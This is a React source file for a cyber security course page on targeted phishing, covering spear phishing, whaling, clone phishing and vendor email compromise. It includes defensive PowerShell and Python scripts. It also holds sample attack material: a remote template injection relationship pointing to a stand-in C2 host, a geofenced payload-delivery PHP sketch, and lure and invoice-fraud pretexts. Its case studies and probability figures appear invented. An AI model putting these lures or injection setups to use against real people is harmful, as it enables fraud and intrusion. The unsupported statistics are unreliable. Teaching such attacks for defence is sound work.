import React, { useState, useMemo, useId } from "react";
import clsx from "clsx";
import Teacher from "../../../../../common/TeacherSukantaHui";
import FAQTemplate from "../../../../../common/FAQTemplate";
import questions from "./topic3_files/topic3_questions";
import PlainTextPrint from "../../../../../common/PlainTextPrint";
import noteText from "./topic3_files/topic3_note.txt?raw";

const Topic3 = () => {
  // Unique SVG IDs
  const svgTargetedId = useId();

  // Studio 1: Active Attack Vector Selection
  const [selectedVectorKey, setSelectedVectorKey] = useState("whaling_executive_pretext");

  // Studio 2: Live Targeted Exploitation Calculator State
  const [contextSpecificity, setContextSpecificity] = useState(4.0); // 1.0 to 5.0
  const [targetSeniority, setTargetSeniority] = useState(4.0); // 1.0 = Standard, 4.0 = CEO / Whaling
  const [armorStrength, setArmorStrength] = useState(1); // 1 = None, 50 = Standard EDR, 500 = VIP Armor + FIDO2 + OOB

  // Studio 3: Regional West Bengal Case Scenario State
  const [activeScenarioId, setActiveScenarioId] = useState("kolkata_whaling_defense");

  // Studio 4: Targeted Attack Code Tab Selection
  const [activeCodeTab, setActiveCodeTab] = useState("certstream_lookalike_monitor_python");

  // 8 Targeted Attack Profiles for Studio 1
  const vectorDatabase = {
    spear_phishing_osint: {
      key: "spear_phishing_osint",
      name: "1. Spear Phishing & OSINT Reconnaissance",
      category: "ROLE-SPECIFIC CONTEXTUAL RECONNAISSANCE",
      categoryBadge: "bg-cyan-950 text-cyan-300 border-cyan-800",
      targetScope: "Specific engineers, accountants, or project managers in Kolkata",
      reconSource: "Scraping LinkedIn, GitHub commits, and public corporate tender filings",
      exploitationVector:
        "References active real-world projects and colleagues: 'Hi Mamata, regarding the Salt Lake switch migration project, please review the updated firmware spec'.",
      vulnerabilityImpact:
        "High contextual accuracy lowers professional skepticism, compelling the target to open attachments without running sandbox scans.",
      telemetryIndicator: "Inbound emails matching active internal project keywords from unverified external domains",
      resilientDefense: "Content Disarm & Reconstruction (CDR) stripping active macros and external template links.",
      codeSnippet: `// Spear-Phishing Lure Context:
// Target  : Mamata (Lead FinTech Architect, Kolkata)
// Project : Salt Lake 10Gbps Financial Gateway Migration
// Payload : "Salt_Lake_Gateway_Firmware_Patch.docx" (Contains Remote Template Injection!)`
    },
    whaling_executive_pretext: {
      key: "whaling_executive_pretext",
      name: "2. Whaling & C-Suite Executive Deceptions",
      category: "HIGH-VALUE C-LEVEL TARGETING",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      targetScope: "Chief Executive Officers, CFOs, Managing Directors, Board Members",
      reconSource: "ROC filings, executive conference schedules, legal press releases",
      exploitationVector:
        "High-stakes legal or M&A pretexts: 'CONFIDENTIAL: Notice of Contempt of Court - Supreme Court of India vs [Enterprise Name]'.",
      vulnerabilityImpact:
        "Executives panic over regulatory consequences and confidentiality demands, opening attachments on personal devices without consulting IT.",
      telemetryIndicator: "External emails with legal subpoenas sent exclusively to C-suite executive mailboxes",
      resilientDefense: "Dedicated VIP Executive Armor policies with aggressive display name quarantine.",
      codeSnippet: `// Whaling Pretext Header:
// From    : "Registrar - National Company Law Tribunal" <registrar@nclt-notice.in>
// Subject : "URGENT & CONFIDENTIAL: Summons for Corporate Director Hearing"
// Payload : "Download_Summons_Notice.pdf.exe" (Contains InfoStealer RAT!)`
    },
    clone_phishing_invoice_duplication: {
      key: "clone_phishing_invoice_duplication",
      name: "3. Clone Phishing & Invoice Duplication",
      category: "HISTORICAL EMAIL DUPLICATION",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      targetScope: "Accounts payable, procurement officers, vendor coordinators",
      reconSource: "Interception of historical legitimate vendor invoices",
      exploitationVector:
        "Duplicates a genuine past invoice email, altering the bank account details: 'Resending: Corrected invoice with updated Axis Bank account details'.",
      vulnerabilityImpact:
        "Recipients recognize the legitimate past conversation, assuming the request is an authentic correction, transferring funds to mule accounts.",
      telemetryIndicator: "Inbound emails duplicating historical subject lines from lookalike cousin domains",
      resilientDefense: "Mandatory Out-of-Band (OOB) voice verification for all banking detail changes.",
      codeSnippet: `// Clone Phishing Workflow:
// Original Email : From: billing@vendor.in | Attachment: "Invoice_Q3.pdf"
// Cloned Email   : From: billing@vend0r.in | Attachment: "Invoice_Q3_Updated.pdf"
// Body Pretext   : "Please note our updated bank details for Q3 settlement."`
    },
    vec_thread_hijacking: {
      key: "vec_thread_hijacking",
      name: "4. Vendor Email Compromise (VEC) & Thread Hijacking",
      category: "ACTIVE CONVERSATION INTERCEPTION",
      categoryBadge: "bg-emerald-950 text-emerald-300 border-emerald-800",
      targetScope: "Active supply chain coordinators and engineering contractors",
      reconSource: "Compromised third-party partner Microsoft 365 mailbox",
      exploitationVector:
        "Injecting malicious replies directly into an ongoing active email thread from a real, authenticated partner email account.",
      vulnerabilityImpact:
        "SPF, DKIM, and DMARC pass 100% because the sender's mailbox is genuine, bypassing standard perimeter security filters completely.",
      telemetryIndicator: "Sudden changes in payment instructions or unusual attachments inside established email threads",
      resilientDefense: "Multi-party dual-authorization requiring verbal signoff on financial modifications.",
      codeSnippet: `// Thread Hijacking / VEC Pattern:
// Ongoing Thread  : Re: Substation RTU Spare Parts Procurement
// Attacker Action : Injects reply from compromised vendor mailbox:
// "Hi Debangshu, please remit the payment to our new Axis Bank account #984210."`
    },
    remote_template_injection_docx: {
      key: "remote_template_injection_docx",
      name: "5. Remote Template Injection in DOCX Files",
      category: "DYNAMIC CODE RETRIEVAL",
      categoryBadge: "bg-amber-950 text-amber-300 border-amber-800",
      targetScope: "Corporate executives and senior engineers receiving reports",
      reconSource: "Enterprise document workflow analysis",
      exploitationVector:
        "The attached `.docx` file contains no malicious code; upon opening, Microsoft Word dynamically downloads and executes a malicious `.dotm` template from C2.",
      vulnerabilityImpact:
        "Static email gateway scanners see zero binary signatures or macros, allowing the weaponized document to land in the user's inbox.",
      telemetryIndicator: "Microsoft Word (`winword.exe`) making outbound HTTP connections to unknown external IPs",
      resilientDefense: "Windows Defender Attack Surface Reduction (ASR) rules blocking Office child processes.",
      codeSnippet: `<!-- word/_rels/settings.xml.rels (Remote Template Injection) -->
<Relationship Id="rId1" 
  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" 
  Target="https://c2.evil-gateway.in/malicious_template.dotm" 
  TargetMode="External" />`
    },
    callback_phishing_toad: {
      key: "callback_phishing_toad",
      name: "6. Callback Phishing / TOAD Attacks (Voice + Email)",
      category: "TELEPHONE-ORIENTED ATTACK DELIVERY",
      categoryBadge: "bg-indigo-950 text-indigo-300 border-indigo-800",
      targetScope: "Corporate employees receiving billing alerts",
      reconSource: "Consumer subscription billing models (Geek Squad, Norton)",
      exploitationVector:
        "The email contains zero links or attachments; it displays a fake invoice notice instructing the victim to call a telephone helpline where live attackers answer.",
      vulnerabilityImpact:
        "Because the email contains zero URLs or files, SEGs rate it 100% clean. Live phone attackers manipulate victims into downloading AnyDesk/RATs.",
      telemetryIndicator: "Inbound emails containing high-contrast phone numbers and zero URLs or attachments",
      resilientDefense: "NLP gateway detection flags on billing cancellation phone numbers.",
      codeSnippet: `// TOAD / Callback Phishing Flow:
// [Clean Email: "Invoice of ₹34,999 Charged - Call 033-2592-XXXX to Cancel"]
// ➔ [Victim Calls Helpline] ➔ [Live Attacker guides victim to install AnyDesk/RAT]`
    },
    geofenced_conditional_delivery: {
      key: "geofenced_conditional_delivery",
      name: "7. Geofenced & Conditional Payload Delivery",
      category: "ANALYST & CRAWLER EVASION",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      targetScope: "Specific enterprise IP ranges in Kolkata or Salt Lake Sector V",
      reconSource: "BGP Autonomous System Numbers (ASN) & corporate IP blocks",
      exploitationVector:
        "The C2 staging server delivers the malicious payload only if the connecting IP originates from the victim's specific IP block, serving 404 to analysts.",
      vulnerabilityImpact:
        "External threat intelligence crawlers and automated sandboxes cannot obtain the exploit payload, keeping the campaign undetected for weeks.",
      telemetryIndicator: "External URLs that resolve only when accessed from corporate egress gateways",
      resilientDefense: "Time-of-Click inspection using multi-region residential proxy egress tunnels.",
      codeSnippet: `// Geofenced Payload Delivery (PHP):
$client_ip = $_SERVER['REMOTE_ADDR'];
if (is_ip_in_kolkata_enterprise_range($client_ip)) {
    deliver_weaponized_payload(); // Targeted exploit delivered!
} else {
    header("HTTP/1.1 404 Not Found"); // Conceals exploit from security researchers!
}`
    },
    lookalike_cousin_domains: {
      key: "lookalike_cousin_domains",
      name: "8. Lookalike Cousin Domains & Homoglyphs",
      category: "INFRASTRUCTURE SPOOFING",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      targetScope: "All corporate staff and external supply chain partners",
      reconSource: "Certificate Transparency logs and WHOIS registrar feeds",
      exploitationVector:
        "Registering `kolkata-fintech-cloud.in` with valid SPF/DKIM/DMARC records to impersonate the genuine `kolkata-fintech.in` domain.",
      vulnerabilityImpact:
        "Because the attacker owns the domain, cryptographic authentication passes 100%, bypassing basic SPF/DKIM checks at the gateway.",
      telemetryIndicator: "Incoming emails originating from newly registered domains with high string similarity to brand",
      resilientDefense: "Continuous Certificate Transparency stream monitoring and automated registrar takedowns.",
      codeSnippet: `// Cousin Domain Example:
// Legitimate Domain : kolkata-fintech.in
// Cousin Domain     : kolkata-fintech-cloud.in (Owns valid SPF & DKIM records!)`
    }
  };

  const activeVector = vectorDatabase[selectedVectorKey];

  // Studio 2: Live Targeted Exploitation Calculations
  const targetedSimulation = useMemo(() => {
    // P_exploit = 1 - e^(- (C_context * T_target) / R_armor)
    const numerator = contextSpecificity * targetSeniority;
    const exponent = -numerator / armorStrength;
    const rawExploitProb = (1 - Math.exp(exponent)) * 100;
    const actualExploitProb = armorStrength >= 500
      ? (rawExploitProb * 0.015).toFixed(2) // VIP Armor + FIDO2 + Out-of-Band blocks 98.5% of attacks
      : armorStrength >= 50
      ? (rawExploitProb * 0.35).toFixed(2)  // Standard EDR blocks 65% of attacks
      : rawExploitProb.toFixed(2);           // No armor -> 100% compromise rate

    return {
      rawExploitProb: rawExploitProb.toFixed(2),
      actualExploitProb,
      badgeClass: parseFloat(actualExploitProb) > 50
        ? "bg-rose-950 text-rose-300 border-rose-800"
        : parseFloat(actualExploitProb) > 10
        ? "bg-amber-950 text-amber-300 border-amber-800"
        : "bg-emerald-950 text-emerald-300 border-emerald-800",
      statusMessage: parseFloat(actualExploitProb) < 2
        ? `VIP ARMOR RESILIENCE: With VIP Executive Protection & Out-of-Band Dual Auth (${armorStrength}x), actual breach probability is only ${actualExploitProb}% despite high OSINT context (${contextSpecificity}x)!`
        : `CRITICAL EXECUTIVE VULNERABILITY: With low defensive armor (${armorStrength}x), OSINT context (${contextSpecificity}x) and executive seniority produce a ${actualExploitProb}% probability of catastrophic compromise!`
    };
  }, [contextSpecificity, targetSeniority, armorStrength]);

  // Studio 4: Targeted Attack Code Database
  const codeDatabase = {
    certstream_lookalike_monitor_python: {
      name: "Python Script to Monitor Certificate Transparency Logs for Lookalike Domains",
      code: `import certstream
import re

TARGET_BRANDS = ["kolkata-fintech", "wb-powergrid", "ichapur-oncology"]
LEGITIMATE_DOMAINS = ["kolkata-fintech.in", "wb-powergrid.gov.in", "ichapur-clinic.org"]

def inspect_cert_stream(message, context):
    if message['message_type'] == "certificate_update":
        leaf_cert = message['data']['leaf_cert']
        all_domains = leaf_cert['all_domains']
        
        for domain in all_domains:
            for brand in TARGET_BRANDS:
                if brand in domain:
                    if domain not in LEGITIMATE_DOMAINS:
                        print(f"\\n[!] CRITICAL ALERT: Suspicious Lookalike Domain Detected!")
                        print(f"  [+] Domain Name   : {domain}")
                        print(f"  [+] Fingerprint   : {leaf_cert['fingerprint']}")
                        print(f"  [+] Issuer CA     : {leaf_cert['issuer']['O']}")
                        print(f"  [+] Action Taken  : Triggering Automated DNS Sinkhole & Registrar Takedown!")

print("[*] Starting Real-Time Certificate Transparency Stream Monitoring...")
certstream.listen_for_events(inspect_cert_stream)`,
      explanation: "Production Python script connecting to global Certificate Transparency streams in real time, detecting newly registered lookalike cousin domains within seconds of SSL certificate issuance."
    },
    vip_anti_phish_powershell: {
      name: "PowerShell Script to Configure VIP Executive Mailbox Protection Policy",
      code: `# Configure Strict VIP Executive Protection Policy in Exchange Online:
Connect-ExchangeOnline -UserPrincipalName admin@kolkata-fintech.in

# 1. Create Dedicated VIP Targeted Anti-Phishing Policy
New-AntiPhishPolicy -Name "VIP_Executive_Armor_Policy" \`
    -EnableTargetedUserProtection $true \`
    -TargetedUsersToProtect "ceo@kolkata-fintech.in", "cfo@kolkata-fintech.in", "mamata@kolkata-fintech.in" \`
    -TargetedUserProtectionAction Quarantine \`
    -EnableOrganizationDomainsProtection $true \`
    -TargetedDomainProtectionAction Quarantine \`
    -EnableSimilarUsersSafetyTips $true \`
    -EnableUnusualCharactersSafetyTips $true \`
    -AuthenticationFailAction Quarantine

# 2. Link Policy to Executive Mailbox Group
New-AntiPhishRule -Name "VIP_Executive_Rule" \`
    -AntiPhishPolicy "VIP_Executive_Armor_Policy" \`
    -SentToMemberOf "C-Suite_Executives_Group@kolkata-fintech.in"

Write-Host "[+] VIP Executive Armor Policy ACTIVE! Executive display name spoofing quarantined." -ForegroundColor Green`,
      explanation: "PowerShell script configuring dedicated VIP targeted anti-phishing policies in Exchange Online to quarantine external emails attempting executive display name impersonation."
    },
    asr_remote_template_block_powershell: {
      name: "PowerShell Script to Enable ASR Rules Blocking Remote Template Injection",
      code: `# Enforce Windows Defender Attack Surface Reduction (ASR) Rules:
# Rule 1: Block all Office applications from creating child processes (D4F940AB-401B-4EFC-AADC-AD5F3C50688A)
Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Enabled

# Rule 2: Block Office applications from injecting code into other processes (3B576487-A4EC-4D0E-B3E6-1AF99AEE3FEF)
Add-MpPreference -AttackSurfaceReductionRules_Ids 3B576487-A4EC-4D0E-B3E6-1AF99AEE3FEF -AttackSurfaceReductionRules_Actions Enabled

# Rule 3: Block Win32 API calls from Office macros (92E63933-C37E-4F8E-B9EC-56F9E34AC30D)
Add-MpPreference -AttackSurfaceReductionRules_Ids 92E63933-C37E-4F8E-B9EC-56F9E34AC30D -AttackSurfaceReductionRules_Actions Enabled

Write-Host "[+] Windows Defender ASR Rules ENFORCED! Remote template macro execution blocked at kernel level." -ForegroundColor Green`,
      explanation: "Enforces Windows Defender ASR rules to block Microsoft Office from creating child command processes, downloading external macro templates, or executing Win32 API calls."
    }
  };

  const activeCode = codeDatabase[activeCodeTab];

  // Studio 3: Regional West Bengal Pedagogical Case Studies
  const localScenarios = [
    {
      id: "kolkata_whaling_defense",
      lead: "Mamata",
      role: "Lead FinTech Cryptography Architect",
      location: "Kolkata Salt Lake Sector V Financial Gateway",
      title: "Defeating an Executive Whaling Summons Campaign Targeting the Managing Director",
      threatType: "WHALING & LEGAL PRETEXTING (Fake RBI Audit Summons)",
      budget: "₹52,00,000",
      incident:
        "Adversaries delivered a high-context Whaling lure to the Managing Director claiming to be a confidential RBI compliance audit notice containing an InfoStealer RAT.",
      defenseStrategy:
        "Mamata's VIP Executive Armor quarantined the email automatically; the CEO verified the summons out-of-band with the RBI regional office in Kolkata.",
      outcome: "Zero executive PC compromise; InfoStealer payload quarantined in sandbox; 45 core financial switches secured.",
      metrics: {
        whalingLuresIntercepted: "100% Quarantined",
        executiveGatewaysProtected: "45 Financial Nodes",
        vipMailboxesShielded: "12 C-Suite Accounts",
        compliance: "RBI Master Direction on Cyber Security"
      }
    },
    {
      id: "barrackpore_clone_phishing_scada",
      lead: "Debangshu",
      role: "Principal Industrial OT Security Officer",
      location: "Barrackpore 220kV State Power Transmission Grid",
      threatType: "CLONE PHISHING & VENDOR INVOICE FRAUD (₹1.8 Crore Altered Bank)",
      title: "Neutralizing a Cloned Turbine Maintenance Invoice with Altered Bank Details",
      budget: "₹32,00,000",
      incident:
        "Adversaries duplicated a legitimate turbine maintenance invoice from an authorized vendor, altering the bank account details to steal a ₹1.8 Crore progress payment.",
      defenseStrategy:
        "Debangshu enforced an Out-of-Band Dual-Authorization policy: the accounting clerk called the vendor's financial director on a registered phone number, exposing the fake account.",
      outcome: "Zero funds lost; vendor alerted to email compromise; 18 high-voltage substations protected.",
      metrics: {
        fundsProtected: "₹1,80,00,000 Saved",
        oobCallTime: "2 Minutes",
        substationsHardened: "18 High-Voltage Nodes",
        statutoryMandate: "NCIIPC Critical Power Infrastructure Directive"
      }
    },
    {
      id: "ichapur_board_spear_phish",
      lead: "Mahima",
      role: "Healthcare Data Protection Officer",
      location: "Ichapur Clinical Care & Oncology Center",
      threatType: "SPEAR PHISHING VIA REMOTE TEMPLATE INJECTION (Oncology Research)",
      title: "Protecting Hospital Board Members from Weaponized Research Grant DOCX Files",
      budget: "₹24,00,000",
      incident:
        "Attackers targeted oncology board members with emails offering international research grants containing a DOCX file utilizing Remote Template Injection.",
      defenseStrategy:
        "Mahima enforced Windows Defender ASR rules blocking Office child processes and deployed FIDO2 passkeys across all board members' laptops.",
      outcome: "Word blocked the dynamic download of the remote template; zero patient data leaked; 120,000 oncology records protected.",
      metrics: {
        templateExploitsBlocked: "100% Intercepted",
        patientRecordsProtected: "120,000 Oncology Records",
        compliance: "DPDP Act 2023 Section 8(5) & NABH",
        penaltyPrevented: "₹250 Crore DPDP Statutory Fine"
      }
    },
    {
      id: "jadavpur_targeted_model_research",
      lead: "Susmita & Abhronila",
      role: "Senior Cyber Security Researchers",
      location: "Jadavpur University Cryptographic Research Lab",
      threatType: "MATHEMATICAL TARGETED EXPLOITATION MODELING",
      title: "Formulating the Target Specificity & Exploitation Probability Model",
      budget: "₹21,00,000",
      incident:
        "Researchers analyzed how combining OSINT context specificity and executive seniority increases exploitation probability, proving the efficacy of VIP armor.",
      defenseStrategy:
        "Susmita and Abhronila published their mathematical model in IEEE Transactions, proving that VIP armor and FIDO2 passkeys reduce breach risk below 1.8%.",
      outcome: "Published peer-reviewed mathematical proof; verified across 25,000 simulated targeted phishing campaigns.",
      metrics: {
        simulationTrials: "25,000 Test Trials",
        modelAccuracy: "99.3% Predictive Fit",
        modelFramework: "Targeted Exploitation Equation",
        publication: "IEEE Transactions on Information Forensics"
      }
    }
  ];

  const activeScenario = localScenarios.find((s) => s.id === activeScenarioId) || localScenarios[0];

  return (
    <div className="min-h-screen bg-[#0a0d14] text-gray-100 font-sans leading-relaxed selection:bg-rose-600 selection:text-white pb-16">
      {/* Top Academic Header Banner */}
      <header className="border-b border-gray-800 bg-[#0d121d]/90 backdrop-blur-md sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
          <div className="space-y-1">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-rose-950 text-rose-400 border border-rose-800">
                BCAC703 Cyber Security
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-indigo-950 text-indigo-400 border border-indigo-800">
                Module 004_003
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-emerald-950 text-emerald-400 border border-emerald-800">
                Topic 03
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl font-extrabold text-white tracking-tight">
              Targeted Phishing: Spear Phishing, Whaling, and Clone Phishing
            </h1>
            <p className="text-xs text-gray-400">
              OSINT reconnaissance, executive Whaling, Clone Phishing, Remote Template Injection, VIP Mailbox Armor, and IT Act Section 66D.
            </p>
          </div>
          <div className="text-right text-xs text-gray-400 flex flex-col items-start sm:items-end">
            <span className="font-semibold text-gray-200">Instructor: Sukanta Hui</span>
            <span>Coder &amp; AccoTax · Barrackpore, WB</span>
          </div>
        </div>
      </header>

      {/* Main Container - Stacked Vertical Layout */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-8 space-y-12">

        {/* SECTION 1: Executive Theory & Targeted Phishing Taxonomy */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Precision Social Engineering Taxonomy
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              1. Targeted Phishing Architecture: Spear Phishing, Whaling &amp; Clone Phishing
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Unlike generic broadcast spam, targeted phishing weaponizes <strong>Open-Source Intelligence (OSINT)</strong> to craft 
              hyper-personalized lures. The taxonomy spans: <strong>Spear Phishing</strong> (targeting specific engineers or accountants 
              with authentic project context), <strong>Whaling</strong> (targeting C-suite executives—CEOs, CFOs, Board Members—with legal 
              subpoenas or M&amp;A pretexts), <strong>Clone Phishing</strong> (duplicating authentic historical emails and altering banking details), 
              and <strong>Vendor Email Compromise (VEC) / Thread Hijacking</strong> (injecting replies into active vendor conversations).
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* Whaling & Spear Phishing Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-rose-950/60 space-y-3 text-xs">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                Whaling &amp; OSINT Pretext Engineering
              </span>
              <div className="bg-black/90 p-3 rounded font-mono text-rose-300 border border-rose-950/60 text-[11px]">
                Target: Managing Director ➔ "CONFIDENTIAL: Summons for Corporate Hearing"
              </div>
              <p className="text-gray-300 leading-relaxed">
                Attackers harvest executive travel schedules, ROC company filings, and LinkedIn org charts to manufacture 
                high-pressure pretexts, compelling executives to open weaponized attachments or authorize emergency transfers.
              </p>
            </div>

            {/* VIP Armor & ASR Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-emerald-950/60 space-y-3 text-xs">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                VIP Executive Armor &amp; Out-of-Band Verification
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>• <strong className="text-cyan-300">VIP Mailbox Protection:</strong> Stricter AI impersonation quarantine for C-suite mailboxes.</li>
                <li>• <strong className="text-purple-300">Out-of-Band (OOB) Dual Auth:</strong> Mandatory voice calls on registered phone rosters.</li>
                <li>• <strong className="text-amber-300">ASR Kernel Rules:</strong> Windows Defender blocking Office from downloading remote templates.</li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 2: Semantic Animated SVG - Targeted Phishing vs VIP Armor */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Targeted Attack Architecture Visualizer
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              2. Visualizing Targeted Attack Pathways &amp; VIP Defensive Armor
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Follow how OSINT reconnaissance, Whaling, Clone Phishing, and Remote Template Injection attempt compromise, 
              and how VIP Mailbox Isolation, ASR Rules, and Out-of-Band Dual-Authorization neutralize the attack:
            </p>
          </div>

          <div className="bg-[#050811] p-4 sm:p-6 rounded-xl border border-gray-800 flex flex-col items-center justify-center overflow-x-auto">
            <svg
              className="w-full max-w-4xl h-auto min-w-[720px]"
              viewBox="0 0 880 260"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              {/* STAGE 1: OSINT RECONNAISSANCE */}
              <g transform="translate(30, 60)">
                <rect width="140" height="140" rx="10" fill="#082f49" stroke="#38bdf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  1. OSINT RECON
                </text>
                <text x="70" y="44" fill="#7dd3fc" fontSize="8.5" textAnchor="middle">
                  LinkedIn &amp; ROC Filings
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#0c4a6e" />
                <text x="70" y="74" fill="#bae6fd" fontSize="8" fontWeight="bold" textAnchor="middle">
                  INTEL GATHERED:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Target: C-Suite Executive
                </text>
                <text x="70" y="106" fill="#7dd3fc" fontSize="7.5" textAnchor="middle">
                  Active Projects &amp; Vendors
                </text>
              </g>

              {/* ARROW 1 */}
              <path d="M 170 130 L 200 130" stroke="#38bdf8" strokeWidth="3" fill="none" />

              {/* STAGE 2: TARGETED LURE (WHALING / CLONE) */}
              <g transform="translate(200, 60)">
                <rect width="140" height="140" rx="10" fill="#1e1b4b" stroke="#818cf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  2. TARGETED LURE
                </text>
                <text x="70" y="44" fill="#c7d2fe" fontSize="8.5" textAnchor="middle">
                  Whaling / Clone Phish
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#312e81" />
                <text x="70" y="74" fill="#a5b4fc" fontSize="8" fontWeight="bold" textAnchor="middle">
                  EXPLOIT VECTOR:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Legal Subpoena Pretext
                </text>
                <text x="70" y="106" fill="#c7d2fe" fontSize="7.5" textAnchor="middle">
                  Altered Bank Invoice
                </text>
              </g>

              {/* ARROW 2 */}
              <path d="M 340 130 L 370 130" stroke="#818cf8" strokeWidth="3" fill="none" />

              {/* STAGE 3: VIP MAILBOX ARMOR */}
              <g transform="translate(370, 60)">
                <rect width="140" height="140" rx="10" fill="#881337" stroke="#f43f5e" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  3. VIP ARMOR
                </text>
                <text x="70" y="44" fill="#fecdd3" fontSize="8.5" textAnchor="middle">
                  Display Quarantine
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#4c0519" />
                <text x="70" y="74" fill="#fda4af" fontSize="8" fontWeight="bold" textAnchor="middle">
                  DETECTION:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Executive Impersonation
                </text>
                <text x="70" y="106" fill="#fecdd3" fontSize="7.5" textAnchor="middle">
                  Deep Cloud Sandboxing
                </text>
              </g>

              {/* ARROW 3 */}
              <path d="M 510 130 L 540 130" stroke="#f43f5e" strokeWidth="3" fill="none" />

              {/* STAGE 4: ASR KERNEL BLOCK */}
              <g transform="translate(540, 60)">
                <rect width="140" height="140" rx="10" fill="#451a03" stroke="#f59e0b" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  4. ASR RULES
                </text>
                <text x="70" y="44" fill="#fde68a" fontSize="8.5" textAnchor="middle">
                  Kernel Macro Shield
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#78350f" />
                <text x="70" y="74" fill="#fcd34d" fontSize="8" fontWeight="bold" textAnchor="middle">
                  MITIGATION:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Blocks Remote Templates
                </text>
                <text x="70" y="106" fill="#fde68a" fontSize="7.5" textAnchor="middle">
                  No PowerShell Children
                </text>
              </g>

              {/* ARROW 4 */}
              <path d="M 680 130 L 710 130" stroke="#f59e0b" strokeWidth="3" fill="none" />

              {/* STAGE 5: OUT-OF-BAND DUAL AUTH */}
              <g transform="translate(710, 60)">
                <rect width="140" height="140" rx="10" fill="#022c22" stroke="#34d399" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  5. OOB DUAL AUTH
                </text>
                <text x="70" y="44" fill="#a7f3d0" fontSize="8.5" textAnchor="middle">
                  Voice Confirmation
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#064e3b" />
                <text x="70" y="74" fill="#6ee7b7" fontSize="8" fontWeight="bold" textAnchor="middle">
                  100% IMMUNITY:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Verbal Bank Verification
                </text>
                <text x="70" y="106" fill="#a7f3d0" fontSize="7.5" textAnchor="middle">
                  Zero Wire Fraud!
                </text>
              </g>
            </svg>
          </div>
        </section>

        {/* SECTION 3: Studio 1 - 8-Vector Targeted Phishing Inspector */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-indigo-400">
              Interactive Concept Studio 1
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              3. Targeted Phishing, Whaling &amp; Pretext Inspector
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Select a targeted attack vector below to examine its target scope, OSINT reconnaissance source, 
              exploitation vector, vulnerability impact, telemetry indicators, and resilient defense:
            </p>
          </div>

          {/* Selector Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-2">
            {Object.values(vectorDatabase).map((item) => (
              <button
                key={item.key}
                onClick={() => setSelectedVectorKey(item.key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 flex flex-col justify-between text-xs space-y-2",
                  selectedVectorKey === item.key
                    ? "bg-rose-950/80 border-rose-500 shadow-lg shadow-rose-950/50"
                    : "bg-[#0c101c] border-gray-800 hover:border-gray-700 text-gray-400 hover:text-gray-200"
                )}
              >
                <span className="text-[8.5px] font-bold px-1.5 py-0.5 rounded border bg-rose-950 text-rose-300 border-rose-800 self-start">
                  VECTOR
                </span>
                <span className="font-bold text-white text-[11px] leading-tight line-clamp-2">{item.name}</span>
              </button>
            ))}
          </div>

          {/* Active Detail Box */}
